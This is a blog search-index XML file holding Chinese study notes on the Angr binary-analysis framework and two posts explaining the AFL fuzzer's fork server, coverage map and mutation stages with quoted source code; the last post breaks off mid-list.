<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title><![CDATA[Angr学习记录]]></title>
    <url>%2F2018%2F09%2F29%2FAngr%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95%2F</url>
    <content type="text"><![CDATA[￥&amp;@+Angr符号执行+@&amp;￥ 参考：http://www.freebuf.com/sectool/143056.htmlhttps://github.com/a7vinx/angr-doc-zh_CN/ Angr简介What is Angr?Angr是一个二进制代码分析工具，能够自动化完成二进制文件的分析,执行动态的符号执行(如Mayhem,KIEE等)。众所周知的是，在二进制代码中寻找并且利用漏洞是一项非常具有挑战性的工作，它的挑战性主要在于人工很难直观的看出二进制代码中的数据结构、控制流信息等。Angr的出现便使得这个问题变得易于解决。Angr是一个基于python的二进制漏洞分析框架,对二进制文件分析，并找到漏洞。使得漏洞挖掘的效率进一步得到提高。基于符号执行的fuzz工具driller就结合了Angr和AFL。 ##Angr的执行！ 将二进制程序利用CLE装载入Angr的分析系统中 将二进制程序转换为中间语言(Intermediate representation,IR) 将IR转换为语义较强的表达形式，形如这个程序做了什么，并非它是什么。 执行进一步的分析，比如，完整的或者部分静态分析(依赖关系分析，程序块分析)、程序空间的符号执行探索(挖掘漏洞)、一些对于上面方式的结合 Angr的安装~Angr是Python下的一个库，目前只在python2下受到支持，相信python3以后也会支持。所以利用python的方法就可以进行安装了，但是关键在于Angr的依赖需要解决： sudo apt-get install python-dev libffi-dev build-essential virtualenvwrapper 依赖结束后执行如下指令即可完成安装： mkvirtualenv angr &amp;&amp; pip install angr #Angr学习* 嗯，幻想一个场景，一场ctf比赛，我门是选手，点开赛题，一道reverse题提供了一个二进制附件名为r100,ok,开始做题。 Angr Project创建对象Project意为项目，这里angr的而金子装载组件是CLE，负责将二进制对象及其依赖的库以及易于对其进行操作的方式交给angr的其他组件。Project就是加载二进制文件的方法。就像做pwn题时候我们使用ELF加载题目一样，道理都是一样的。 import angr p = angr.Project(&apos;./r100&apos;) 信息查询使用上述方法之后就已经把r100这个二进制文件进行了加载。这时候我们便可以得到很多关于这个二进制文件的信息了。 p.entry //二进制文件的入口点 p.loader.min_addr()/p.loader.max_addr() //二进制文件内存空间中的最小地址和最大地址 p.filename //二进制文件的名称，即r100 程序交互loader方法代表了已经装载了的和映射到内存空间中的CLE二进制对象。每一种二进制对象都是由一种可以处理这种文件类型的后端装载器装载，比如ELF就是用以装载ELF文件。 CLE的交互指令如下： p.loader //一个CLE装载器对象 p.loader.shared_objects //这是一个字典，包含已经作为二进制文件的一部分而装载的对象(种类取决于后端装载器) p.loader.memory[b.loader.min_addr()] //这是装载后的进程的内存空间，它包含具体的地址与对应的值 p.loader.addr_belongs_to_object(b.loader.max_addr()) //返回映射在指定地址的二进制对象。 p.loader.find_symbol_got_entry(‘__libc_start_main’) //获取二进制文件的got表地址 与独立的二进制对象交互： p.loader.main_bin.deps //这里获取程序依赖的库名列表，通过读取ELF文件的dynamic section的DT_NEEDED域获取。 注：dynamic sections下的NEEDED元素保存了以NULL结尾的字符串表的偏移量，这些字符串都是所依赖库的名字。 p.loader.main_bin.memory //这是关于主二进制对象的内存内容的dict p.loader.shared_objects[‘libc.so.6’].imports //这是一个装载的libc所需的导入条目的dict(name–&gt;ELFRelocation) p.loader.main_bin.imports 这一个是主二进制对象所需的导入条目的dict(name–&gt;ELFRelocation),地址通常为0. 装载选项CLE工作时会默认地尝试装载二进制文件所需的依赖（比如libc.so.6等），除非装载选项中进行设置auto_load_libs为False。当装载库文件的时候，如果无法找到，装载器会默认忽略产生的错误并且标记所有关于那个库的依赖为已解决的状态。 装载选项传递是以dict形式进行传递。传递给Project后会转传给CLE。如上所示，如果我们想要设置选项为不装载依赖库，则可以使用如下指令： p=angr.Project(&apos;./r100&apos;,load_options={&quot;auto_load_libs&quot;:Flase}) 除此以外，其他的装载选项列举如下： load_options[‘force_load_libs’] = [‘libleet.so’] //无论是否是目标二进制文件所需要的，强制装载的库的list load_options[‘skip_libs’] = [‘libc.so.6’] //需要跳过的库的list load_options[‘main_opts’] = {‘backend’: ‘elf’} //装载主二进制文件时的选项 load_options[‘lib_opts’] = {‘libc.so.6’: {‘custom_base_addr’: 0x13370000}} //映射库名到其装载时需要使用的选项dict的dict load_options[‘custom_ld_path’] = [‘/etc/libs’] //可以进行额外搜索的路径list load_options[‘ignore_import_version_numbers’] = False //是否将文件名中版本号不同的库视作相同的，比如libc.so.6和libc.so.0 load_options[‘rebase_granularity’] = 0x1000 //在重定位共享对象的基址的时候需要使用的对齐值 load_options[‘except_missing_libs’] = True //如果找不到一个库，抛出一个异常（默认行为是忽略未找到的库） 下面两个选项被应用于每一个对象并且覆盖CLE的自动检测。它们可以通过main_opts或者lib_opts来应用。 load_options[‘main_opts’]={‘custom_base_addr’:0x4000} //装载二进制文件的基址为0x4000 load_options[‘main_opts’]={‘backend’:’elf’} //指定对象的后端装载器(这里指定为elf) 上面两者可同时设置，如下所示： load_options[‘main_opts’]={‘backend’:’elf’,’custom_base_addr’:0x40000} 后端装载器选项CLE集成了ELF,PE，CGC及ELF核心转储文件的后端支持，像IDA一样可以将文件装载。在CLE运作时，会自动检测需要使用的后端，当然如果已经知晓文件的结构信息，也可进行手动指定。关键字backend指定后端，custom_arch关键字指定架构。 load_options[‘main_opts’] = {‘backend’:’elf’,’custom_arch’:’i386’} load_options[‘lib_opts’] = {‘libc.so.6’:{‘backend’：’elf’}} 后端关键字 描述 是否需要custom_arch elf 基于PyELFTools的ELF装载器 no pe 基于PEFile的PE装载器 no cgc Cyber Grand Challenge文件的装载器 no backedcgc 支持指定内存和寄存器支持CGC文件装载器 no elfcore ELF核心转储文件的装载器 no ida 启动IDA来解析文件 yes blob 装载文件到内存中作为一个平坦的镜像 yes]]></content>
      <categories>
        <category>binary</category>
      </categories>
      <tags>
        <tag>Angr</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Studying-Afl-fuzz之内部实现介绍]]></title>
    <url>%2F2018%2F09%2F10%2FStudying-Afl-fuzz%E4%B9%8B%E5%86%85%E9%83%A8%E5%AE%9E%E7%8E%B0%E4%BB%8B%E7%BB%8D%2F</url>
    <content type="text"><![CDATA[AFL(American Fuzzy Lop) AFL的基本使用以及模式都在前面介绍了大概，通过了前面的学习应当能够了解到了AFL对一个对象的fuzz该如何操作，通俗的说，这只是表面工作，追根溯源才是硬道理，在afl-2.52的工具文件中包含了所有工具的源代码，通过对afl-fuzz.c的源码进行简单阅读之后，总结了AFL的实现细节。 参考：http://lcamtuf.coredump.cx/afl/technical_details.txthttp://rk700.github.io/2017/12/28/afl-internals/ Fork Server使用afl-fuzz对目标程序进行fuzzing，过程精简和如下步骤： 获得队列中的一个用例。 对用例进行N多阶段的变化。 在变化过程中以及变化结束都会将得到的变异文件作为输入给目标程序进行测试。 测试得到大量数据写入对应文件，主要关注输入目标程序后是否会引发崩溃。 如上诸多步骤的运行，涉及到多进程运行，在伪代码中也可以找到实现fork的相关代码。 EXP_ST void init_forkserver(char** argv) { static struct itimerval it; int st_pipe[2], ctl_pipe[2];//通信管道state and command int status; s32 rlen; ACTF(&quot;Spinning up the fork server...&quot;); if (pipe(st_pipe) || pipe(ctl_pipe)) PFATAL(&quot;pipe() failed&quot;); forksrv_pid = fork(); //fork()获取父子进程 if (forksrv_pid &lt; 0) PFATAL(&quot;fork() failed&quot;); if (!forksrv_pid) { struct rlimit r; if (!getrlimit(RLIMIT_NOFILE, &amp;r) &amp;&amp; r.rlim_cur &lt; FORKSRV_FD + 2) { r.rlim_cur = FORKSRV_FD + 2; setrlimit(RLIMIT_NOFILE, &amp;r); /* Ignore errors */ } ...... （此处省略约260行代码） ...... } FATAL(&quot;Fork server handshake failed&quot;); } 解析： 通过函数的命名就可以初步了解到，这是fork_server的初始化部分，从上面附有的代码可以看到，fuzzer启动，执行fork()得到父子进程，父进程为fuzzer，子进程就是fuzz目标程序。 同时在初始化中我们可以看到定义了两个整型：st_pipe以及ctl_pipe,父子之间的通信就是通过这两个管道进行，前者用于传递状态，后者用于传递命令。 在调用完fork()之后，可以看到，对于错误也有严谨的排查，是否成功获取进程，使用到的getrlimit以及setrlimit是用于获取和设定资源使用的限制，根据参数的选择对指定的资源进行检查并进行限制设定。上述例子中的RLIMIT_NOFILE是指比指定进程可打开的最大文件数量多1的值，若超过此值则会报错。在省略部分还有对于进程数据段、虚拟内存和core文件等进行限制设定。 dup2(dev_null_fd, 1); dup2(dev_null_fd, 2); if (out_file) { dup2(dev_null_fd, 0); } else { dup2(out_fd, 0); close(out_fd); } if (dup2(ctl_pipe[0], FORKSRV_FD) &lt; 0) PFATAL(&quot;dup2() failed&quot;); if (dup2(st_pipe[1], FORKSRV_FD + 1) &lt; 0) PFATAL(&quot;dup2() failed&quot;); ...... (此处省略30行左右) ...... execv(target_path, argv); 解析： dup2函数是用于复制文件描述符。文件描述符在linux下的存在就是0、1、2,分别表示标准输入，标准输出以及标准错误，在某些情况下也用STDIN、STDOUT、STDERR代表。 这里连续两个if条件中的dup2使用将两个通信管道分配到了预先指定的fd中，同时也排查了分配失败的错误，省略部分对已经没有必要的fd进行了关闭操作，节省资源，同时对ASAN、MSAN进行了设置。 一切设置就绪后，就开始执行fuzz目标程序。 it.it_value.tv_sec = ((exec_tmout * FORK_WAIT_MULT) / 1000); it.it_value.tv_usec = ((exec_tmout * FORK_WAIT_MULT) % 1000) * 1000; setitimer(ITIMER_REAL, &amp;it, NULL); rlen = read(fsrv_st_fd, &amp;status, 4); it.it_value.tv_sec = 0; it.it_value.tv_usec = 0; setitimer(ITIMER_REAL, &amp;it, NULL); if (rlen == 4) { OKF(&quot;All right - fork server is up.&quot;); return; } 解析： 上附代码，等待fork server启动，等待启动的时间有所限制，ITIMER_REAL设置以系统实时时间进行计算，超时则会发出SIGALRM信号，限制时间内若父进程(fuzzer)成功读取状态管道信息，则返回信息提示fork server创建成功。 小结： fork server 与fuzzer之间的通信，就fork server而言，可归纳为下面几步： fork server创建成功，已经将状态写入管道，fuzzer接收到信息，知道可以fork。 fork server开始等待(有时限)，接受来自fuzzer的命令(通过命令通道)，便开始fork,获取父子进程。 fork server开始实时监控，fuzz目标子进程运行时候，fork server通过状态管道将子进程pid发送给fuzzer，当子进程结束，同样将结束状态发送给fuzzer。然后再次回归等待，静候fuzzer的下一次指令。 static u8 run_target(char** argv, u32 timeout) { static struct itimerval it; static u32 prev_timed_out = 0; int status = 0; u32 tb4; child_timed_out = 0; ...... （省略开头） if ((res = write(fsrv_ctl_fd, &amp;prev_timed_out, 4)) != 4) ...... if ((res = read(fsrv_st_fd, &amp;child_pid, 4)) != 4) { ...... if (child_pid &lt;= 0) FATAL(&quot;Fork server is misbehaving (OOM?)&quot;); } setitimer(ITIMER_REAL, &amp;it, NULL); ...... if ((res = read(fsrv_st_fd, &amp;status, 4)) != 4) { } ...... if (WIFSIGNALED(status) &amp;&amp; !stop_soon) { kill_signal = WTERMSIG(status); if (child_timed_out &amp;&amp; kill_signal == SIGKILL) return FAULT_TMOUT; return FAULT_CRASH; } 解析： 首先看到函数命名就可以知道，这一处有关于执行fuzz目标程序的，开头一大段的代码对相关信息的设置，与fork server初始化中的代码相似功能，这里就不在赘述。 每当fuzzer从队列中获取到测试用例，都会调用这个方法，图中连续的if便是通过状态管道获取子进程的pid，if后省略的都是再获取失败情况下的报错提示。 同样的，在fuzzer最后读取到子进程退出状态时，会对子进程结束的原因进行判断，并对其进行记录，如果是崩溃，则将用例记入crashes中，如果是超时则将用例记入hangs中。 小结： fork server 与fuzzer之间的通信，就fuzzer而言，可归纳为下面几步： fuzzer从状态管道获得fork server准备完毕可以fork的信息，从队列中获取到测试用例，调用run_target方法的同时，从命令通道通知fork server开始fork。 fuzzer 从状态管道接收fork server发送来的子进程的pid以及结束状态，对结束状态进行判断原因并进行记录。 再次从queue中获取测试用例进行通信。 共享内存EXP_ST void setup_shm(void) { u8* shm_str; if (!in_bitmap) memset(virgin_bits, 255, MAP_SIZE); memset(virgin_tmout, 255, MAP_SIZE); memset(virgin_crash, 255, MAP_SIZE); shm_id = shmget(IPC_PRIVATE, MAP_SIZE, IPC_CREAT | IPC_EXCL | 0600); if (shm_id &lt; 0) PFATAL(&quot;shmget() failed&quot;); atexit(remove_shm); shm_str = alloc_printf(&quot;%d&quot;, shm_id); if (!dumb_mode) setenv(SHM_ENV_VAR, shm_str, 1); ck_free(shm_str); trace_bits = shmat(shm_id, NULL, 0); if (!trace_bits) PFATAL(&quot;shmat() failed&quot;); } 解析： 如果我们进行fuzz时候选择的是dumb mode，那么就不会使用共享内存，因为，在dumb mode下，所有的测试都是随机进行的。 在非dumb mode的时候，AFL需使用功能共享内存来传递执行过程中的分支信息，从而判断执行流程以及代码覆盖状况。 首先调用shemget()分配一块共享内存，shemget原型及介绍如下： shmget(key_t key, size_t size, int shmflg) key： 0(IPC_PRIVATE)：会建立新共享内存对象 大于0的32位整数：视参数shmflg来确定操作。通常要求此值来源于ftok返回的IPC键值 size： 大于0的整数：新建的共享内存大小，以字节为单位 0：只获取共享内存时指定为0 shmflg：0：取共享内存标识符，若不存在则函数会报错 IPC_CREAT：当shmflg&amp;IPC_CREAT为真时，如果内核中不存在键值与key相等的共享内存，则新建一个共享内存；如果存在这样的共享内存，返回此共享内存的标识符 IPC_CREAT|IPC_EXCL：如果内核中不存在键值 与key相等的共享内存，则新建一个共享内存；如果存在这样的共享内存则报错 分配成功后，fuzzer会将该共享内存的标识符设置到环境变量中，这样一来，后面fork得到的子进程可以通过该环境变量得到这块共享内存。同时，fuzzer会使用变量trace_bits保存共享内存的地址。在每次获取测试用例调用fuzz目标程序时候，都得将共享内存的数据情况，避免影响测试结果。 注：如果使用了fork server模式，那么上述获取共享内存的操作，是在fork server中进行；随后fork出来的子进程，只需直接使用这个共享内存即可。 分支信息记录上面提到了分支信息，那么什么是分支信息呢，举个例子，我们想要去某个地方，但是不知道如何前往，那么我们可以借助搜索引擎，不出意外的话，搜索引擎会为你规划出很多中前往的方法，同样的，如果我们使用ffmpeg去对视频文件进行解析的时候，肯定也会在途中经历不少的路径分支。 参考官方文档可以知道，AFL是根据二元tuple(跳转的源地址和目的地址)来记录这些分支信息，从而从中得到执行流程以及代码覆盖情况： cur_location = &lt;COMPILE_TIME_RANDOM&gt;; shared_mem[cur_location ^ prev_location]++; prev_location = cur_location &gt;&gt; 1; 解析: 为简化连接复杂对象的过程和保持xor输出的平均分布，当前位置是随机产生的，我们再到在fuzz前的编译中，afl-as在进行插桩时会添加相应指令，同时会随机生成一个0到MAP_SIZE之前的数，从而实现伪代码中的第一句。 share_mem数组是一个调用者传给被instrument程序的64KB的共享内存区域。AFL为每个代码块生成一个随机数，作为其“位置”的记录；随后，对分支处的”源位置“和”目标位置“进行异或，并将异或的结果作为该分支的key。然后map中的每一byte都保存被插桩程序中的(branch_src,brance_dst)命中信息。 因为保存执行次数的实际是一张哈希表所以会存在碰撞问题。我们选择MAP_SIZE=64K,这其中可以保存大约 2k 到 10k程序分支点。对于不是很复杂的程序程序的碰撞还是可以接受的： Branch cnt | Colliding tuples | Example targets ------------+------------------+----------------- 1,000 | 0.75% | giflib, lzo 2,000 | 1.5% | zlib, tar, xz 5,000 | 3.5% | libpng, libwebp 10,000 | 7% | libxml 20,000 | 14% | sqlite 50,000 | 30% | - 之前已经介绍了在fuzz过程中展现的状态表单，其中map coverage这一模块就告知了分支路径覆盖的相关信息。 最后，为什么要讲cur_location进行右移呢？原因在于避免错误判断，举个通用例子，这里存在有A-&gt;A与B-&gt;B或者是A-&gt;B与B-&gt;A的路径跳转，不进行右移的话，A^A与B^B的结果相同，B^A与A^B的结果相同。那么就无法区分这几种路径。 小结： 共享内存实际被用于保存一张hash表，目标程序在表中记录每个分支的执行次数，当fuzz结束之后，fuzzer便会对表进行分析，从而判断代码的执行情况。 分支信息分析那么fuzzer是如何对分支信息进行分析的呢，见如下代码(类似部分已省略)： static const u8 count_class_lookup8[256] = { [0] = 0, [1] = 1, [2] = 2, [3] = 4, [4 ... 7] = 8, [8 ... 15] = 16, [16 ... 31] = 32, [32 ... 127] = 64, [128 ... 255] = 128 }; static u16 count_class_lookup16[65536]; EXP_ST void init_count_class16(void) { u32 b1, b2; for (b1 = 0; b1 &lt; 256; b1++) for (b2 = 0; b2 &lt; 256; b2++) count_class_lookup16[(b1 &lt;&lt; 8) + b2] = (count_class_lookup8[b1] &lt;&lt; 8) | count_class_lookup8[b2]; } #ifdef __x86_64__ static inline void classify_counts(u64* mem) { u32 i = MAP_SIZE &gt;&gt; 3; while (i--) { if (unlikely(*mem)) { u16* mem16 = (u16*)mem; mem16[0] = count_class_lookup16[mem16[0]]; mem16[1] = count_class_lookup16[mem16[1]]; mem16[2] = count_class_lookup16[mem16[2]]; mem16[3] = count_class_lookup16[mem16[3]]; } mem++; } } #else static inline void classify_counts(u32* mem) { ...... } 解析: 这里fuzzer对trace_bits(共享内存)进行预处理，以64位目标程序为例，这里target是将每个分支的执行次数用1个byte来存储，fuzzer通过上述代码将其进行归类。 举个例子，如果某个分支执行了1次，那么就赋值为1，归为第二类，如果分支执行了4次，那么赋值为8，归为第五类，等等。 这样处理之后，就可以对分支执行次数进行一个简单的分类。如果不同测试用例在同一个分支下执行次数处于同一个类中，那么AFL就会认为这两次代码覆盖是相同的。当然，这样的简单分类肯定不能区分所有的情况，不过在某种程度上，处理了一些因为循环次数的微小区别，而误判为不同执行结果的情况。 分类之后，fuzzer还会对未出现崩溃等异常输出的执行检查是否新增了执行路径，最有效的方法就是通过hash比较。 u32 cksum = hash32(trace_bits, MAP_SIZE, HASH_CONST); 对tarce_bits进行哈是计算然后比较，就可以判断其是否发生变化，从而判断是否存在新的执行路径，为之后的fuzz提供参考信息。 总结本篇介绍了AFL运行是的几个细节实现，当然，在afl-fuzz的源码之中远不止这些，里面还包含时间获取、文件变异处理、文件比较，状态表单构造、cpu状态监测、fuzz输出文件生成、相关数据写入等信息，有兴趣的可以自行阅读，如果只是想使用AFL，那么只需要学会它的基础操作以及了解它的输出信息即可，但是想要对这个AFL进行DIY的话，还是比较有必要精读它的源码了解相关的操作。 阅读代码时候大可不必行行精读，可以根据main函数中的调用，来找到对应的方法进行阅读，理解其中的操作。在afl-fuzz中作者也有许多的注释来帮助读者进行理解。]]></content>
      <categories>
        <category>binary</category>
      </categories>
      <tags>
        <tag>fuzz</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Studying-Afl-fuzz之文件处理介绍]]></title>
    <url>%2F2018%2F08%2F31%2FStudying-Afl-fuzz%E4%B9%8B%E6%96%87%E4%BB%B6%E5%A4%84%E7%90%86%E4%BB%8B%E7%BB%8D%2F</url>
    <content type="text"><![CDATA[AFL(American Fuzzy Lop) 前言前篇已经对AFL的环境搭建、使用做了介绍，并且使用FFmpeg对fuzz之前要做的准备做了介绍，除此以外，AFL自带的几个辅助工具也一一进行了演示介绍。 AFL对于目标的fuzz主要就是利用fuzzer提供的testcase或者是自主随机生成的一系列testcase。但并非直接喂给目标程序进行测试，而是通过好几个阶段进行了处理之后才执行的。这儿就按我理解的介绍一下AFL是如何对输入文件进行处理的。 参考：http://lcamtuf.coredump.cx/afl/status_screen.txthttp://rk700.github.io/2018/01/04/afl-mutations/ AFL的fuzz过程大体概述就是fuzzer将提供case进行排列，按序选取文件后按照几个阶段的顺序对其进行确定性变异或者是随机混乱的变异，然后将所有处理过后的case喂给目标程序，并且检查运行后是否会触发目标的崩溃，或是发现新路径等结果。 阶段总括AFL对文件处理的几个阶段如下： 准备阶段此阶段会对fuzz对象以及测试case进行检查以及相关变换。 calibration：校准阶段，此阶段会检查执行的路径是否异常，检查基线执行速度等。只要进行了新的查找，都会简单执行此阶段。 trim(L(长度)/S(步长))：修剪阶段，作用于测试case，简化为能够执行相同路径的case，去除无关痛痒的部分。略微真加fuzz效率。选择长度和步长与case大小有关。 确定性阶段确定性测试阶段包括bitflip、arithmetic、interest、dictionary。之前介绍的主从模式中的-M策略在fuzz过程中只会执行这几个确定性阶段。 bitflip(L/S)：确定性位翻转。(即1变为0，0转为1)在任何给定时间都有L位切换，以S位递增的方式遍历输入文件。目前的L / S变体是：1 / 1,2 / 1,4 / 1,8 / 8,16 / 8,32 / 8。 arithmetic(L/8)：整数加减运算，fuzzer将整数减去或增加到8位，16位或32位值，S总为8。 interest(L/8)：确定性的值覆盖，在fuzzer中已经有用于覆盖的值列表，值为8位，16位和32位，覆盖case中的值以产生变异。 dictionary：字典输入，用户可以使用-x指定字典进行输入对case进行变异，当然，如果用户没有指定输入，那么fuzzer也会自动生成token进行输入变异。 随机性阶段-d模式以及-S策略则不会执行上述4个确定性阶段，取而代之的则是havoc和splice这两个随机性阶段。 havoc：一直固定长度的循环，在此阶段会对case进行大规模的变异处理，包括随机、整数覆盖，块删除、块重复一起其他的一些操作。 splice：无新路径被发现的情况下，这一步便是启动的最后的策略，此阶段会从队列随机选择case进行拼接作为输入。 阶段介绍Bitflip从队列中获取到文件之后，经过简单的校准以及修剪处理之后，进入确定性阶段进行第一步。 bitflip,会根据文件大小确定长度和步长进行不同的翻转，进行翻转的类型有6种，在总括中已经提及，bitflip 1/1意味着每次翻转1个bit，按照每1个bit的步长从头开始翻转，以此类推。 检测token本阶段除了按位及长度翻转以外，在每次翻转后还会对token进行检查，在经过翻转操作后，如果连续多个字节的最低位被翻转，程序执行路径都不变，并且与原始执行路径不一致，则把这一段连续的bytes判断为一个token。 举个例子，我们熟知的PNG文件如何去辨识。对，看它的头文件，PNG的头文件标识为IHDR，使用记事本格式打开一个PNG文件便可以看到开头会有如下信息： ........IHDR........ 当翻转到字符I时候，I为0b1001001,经过翻转之后则变为0b0110110，对应的ASCALL就是6，这样一来便破坏了PNG文件的文件头标识，那么此时程序对该文件的处理路径与处理正常PNG文件的路径绝对是不相同的。同样的I经过翻转后已经破坏了文件头标识，对于后面三个字节进行翻转则显得不是很重要，程序会采取相同的执行路径，那么此时AFL便会识别出一个可能的token：IHDR，并将其记录下来为后面的变异提供资源。 *其本质，AFL对case的每个byte进行了修改并检查执行路径，但将这些集成到了bitflip中，就不需要浪费额外的执行资源，不仅如此，为了控制使用这种生成token的方法，AFL在配置文件中特地宏定义了对长度和数量的限制： /* Length limits for auto-detected dictionary tokens: */ #define MIN_AUTO_EXTRA 3 #define MAX_AUTO_EXTRA 32 /* Maximum number of auto-extracted dictionary tokens to actually use in fuzzing (first value), and to keep in memory as candidates. The latter should be much higher than the former. */ #define USE_AUTO_EXTRAS 50 #define MAX_AUTO_EXTRAS (USE_AUTO_EXTRAS * 10) 就例如PNG文件，我们已经知道了它出现的token的长度为4，或者其他的token不会超过4，那么我们就可以修改MAX_AUTO_EXTRA为4并重新编译AFL。以排除一些不可能是token的情况从而加快效率，唯一的不足在于这类定义是通过宏定义实现，所以不能做到运行时指定，每次修改后必须重新编译AFL才可以生效。 生成effector map在进行bitflip 8/8时候，AFL还会生成一个非常重要的信息：effector map,生成的这个map将会在整个确定性阶段起着不小的作用。 当进行翻转的时候，对一个byte翻转后，如果其执行路径与原始路径不一致，则将该byte在effector map中标记为1，即为“有效”的，否则标记为0。 这样的逻辑在于：如果在一个byte完全翻转后都无法导致执行路径的改变，则此byte对于整个fuzzing的意义不大，很可能是“data”，而非“metadata”（例如文件size，flag等），所以，在随后的一些变异中，会参考effector map，跳过那些无效byte，直击主要部分，以达到节省资源，提高效率的目的。 在dumb mode和-S模式下，处于的是随机性阶段，此时文件的所有的字符都有可能被变异，所以在此情况下不会对有效字符进行检测，除此以外，在宏定义中同样对使用有效字符检测作了限制： /* Minimum input file length at which the effector logic kicks in: */ #define EFF_MIN_LEN 128 /* Maximum effector density past which everything is just fuzzed unconditionally (%): */ #define EFF_MAX_PERC 90 如上限制，如果输入的文件的大小小于128byte，那么默认所有字符都是有效的，同样的，如果AFL检测一个文件存在有90%的有效bytes，那么则主动默认所有字符均为有效。 Arithmetic与bitflip类似的是，在此阶段同样分成了几个子阶段，但是每个子阶段的步长以及固定为8，arithmetic分为了以下几个阶段：8/8、16/8、32/8。 同样的，以arith 8/8为例，此阶段操作为每次对8个bit(即1byte)进行加减运算，按照每8bit的步长从头开始，对文件的进行整数加减变异，以此类推。 加减变异的上限，同样在配置文件中的宏ARITH_MAX定义，默认为35。 /* Maximum offset for integer addition / subtraction stages: */ #define ARITH_MAX 35 所以，对目标整数会进行+1, +2, …, +35, -1, -2, …, -35的变异。考虑到整数存在大端序和小端序两种表示方式，AFL会对两种表达方式都进行变异。 此外，AFL还会机智地跳过某些arithmetic变异情况。 effector map如果记录某个整数的所有byte都为无效，则跳过。 经过之前bitflip已经生成过的变异，如果加减某数后效果与之前bitflip生成的相同，则说明这次变异已经在上个阶段执行过了，跳过。 Interest环环相扣，interest阶段与arithmetic的三个阶段一样，分为8/8、16/8、32/8。 这里interest 8/8每次对8个bit(1byte)进行替换，按照8个bit的步长从头开始，对文件的每个byte进行替换，以此类推。 用于替换的”interesting values”,是AFL预设的一些比较特殊的数： /* Interesting values, as per config.h */ static s8 interesting_8[] = { INTERESTING_8 }; static s16 interesting_16[] = { INTERESTING_8, INTERESTING_16 }; static s32 interesting_32[] = { INTERESTING_8, INTERESTING_16, INTERESTING_32 }; 而这些书对应与配置文件中的定义如下： /* List of interesting values to use in fuzzing. */ #define INTERESTING_8 \ -128, /* Overflow signed 8-bit when decremented */ \ -1, /* */ \ 0, /* */ \ 1, /* */ \ 16, /* One-off with common buffer size */ \ 32, /* One-off with common buffer size */ \ 64, /* One-off with common buffer size */ \ 100, /* One-off with common buffer size */ \ 127 /* Overflow signed 8-bit when incremented */ #define INTERESTING_16 \ -32768, /* Overflow signed 16-bit when decremented */ \ -129, /* Overflow signed 8-bit */ \ 128, /* Overflow signed 8-bit */ \ 255, /* Overflow unsig 8-bit when incremented */ \ 256, /* Overflow unsig 8-bit */ \ 512, /* One-off with common buffer size */ \ 1000, /* One-off with common buffer size */ \ 1024, /* One-off with common buffer size */ \ 4096, /* One-off with common buffer size */ \ 32767 /* Overflow signed 16-bit when incremented */ #define INTERESTING_32 \ -2147483648LL, /* Overflow signed 32-bit when decremented */ \ -100663046, /* Large negative number (endian-agnostic) */ \ -32769, /* Overflow signed 16-bit */ \ 32768, /* Overflow signed 16-bit */ \ 65535, /* Overflow unsig 16-bit when incremented */ \ 65536, /* Overflow unsig 16 bit */ \ 100663045, /* Large positive number (endian-agnostic) */ \ 2147483647 /* Overflow signed 32-bit when incremented */ 可以看出，用以替换的基本都是可能造成溢出的数。 在这里，effector map同样不会闲着，他会继续判断是否需要接受变异；除此以外，如果是与之前两个阶段变异得到的值一样，那么这种重复变异是会被跳过的。 dictionary这个阶段就是确定性阶段的最后一步了，他的子阶段如下所示： user extras (over)，从头开始，将用户提供的tokens依次替换到原文件中 user extras (insert)，从头开始，将用户提供的tokens依次插入到原文件中 auto extras (over)，从头开始，将自动检测的tokens依次替换到原文件中 user extras（over）此阶段接收用户指定的token，AFL先按照长度进行大小排序，这样一来就保证了，后面的token不会比之前的段，从而每次覆盖替换后不需要再回复到原状。 在配置文件中如下设置限制了tokens的数量为200： /* Maximum number of user-specified dictionary tokens to use in deterministic steps; past this point, the &quot;extras/user&quot; step will be still carried out,but with proportionally lower odds: */ #define MAX_DET_EXTRAS 200 如果AFL得到的tokens数量超过默认的200个，那么就会根据每个token的概率来决定是否将其替换，判断替换源码如下： for (j = 0; j &lt; extras_cnt; j++) { /* Skip extras probabilistically if extras_cnt &gt; MAX_DET_EXTRAS. Also skip them if there&apos;s no room to insert the payload, if the token is redundant, or if its entire span has no bytes set in the effector map. */ if ((extras_cnt &gt; MAX_DET_EXTRAS &amp;&amp; UR(extras_cnt) &gt;= MAX_DET_EXTRAS) || extras[j].len &gt; len - i || !memcmp(extras[j].data, out_buf + i, extras[j].len) || !memchr(eff_map + EFF_APOS(i), 1, EFF_SPAN_ALEN(i, extras[j].len))) { stage_max--; continue; } 其中 UR(extras_cnt)是运行时生成一个0到extras_cnt之间的随机数。所以，如果用户字典中有N(N&gt;默认值)个tokens，那么每个token就有200/N的概率执行替换变异。当然我们可以到配置文件中修改这个分子值来调整概率。 effector map在代码中也同样被使用了，如果要替换的目标bytes全部都是标记为无效的，那么就跳过这一段，对下一段目标继续执行判断是否替换。 user extras(insert)这个子阶段是对用户指定的token进行插入变异。不过与上一个子阶段不同的是，此时并没有对tokens数量进行限制，所以全部的tokens都要从原文件的第一个byte开始一次往后进行插入操作；由于并未对文件本身的数据进行操作，所以effector map就不会进行作用。 众所周知，bitflip的操作就是0与1的转换翻转，如果想要恢复，直接将变异一次的文件再次进行bitflip相同子阶段的操作即可。 而这一子阶段的操作恢复起来则显得复杂，AFL采取的方法就是:将原文件分割为插入前和插入后的部分，再加入插入的内容，将这3个部分依次复制到目标缓冲区中。(这里在源码中还有一些其他小的优化，具体可阅读5876行起的代码。)而对每个token的每处插入，都需要进行上述过程。所以说，越多的tokens意味着执行的运算越多。 如果在AFL的表单中显示”user extras(insert)”的总执行量很大，执行时间很长。如果出现了这种情况，那么就可以考虑适当删减一些tokens。 auto extras(over)这一项与第一子阶段操作一样，但是这里使用的token并非用户提供，而是由bitflip自动生成。，在配置文件中也对自动生成的tokens总量USE_AUTO_EXTRAS作了限制： /* Maximum number of auto-extracted dictionary tokens to actually use in fuzzing (first value), and to keep in memory as candidates. The latter should be much higher than the former. */ #define USE_AUTO_EXTRAS 50 #define MAX_AUTO_EXTRAS (USE_AUTO_EXTRAS * 10) havoc完成了确定性阶段的变异后，下面就进入随机性阶段。对于dumb mode以及-S模式，是直接从这个阶段开始的。 在这个阶段，每一轮都由多种方式组合而成: 随机选取某个bit进行翻转 随机选取某个byte，将其设置为随机的interesting value 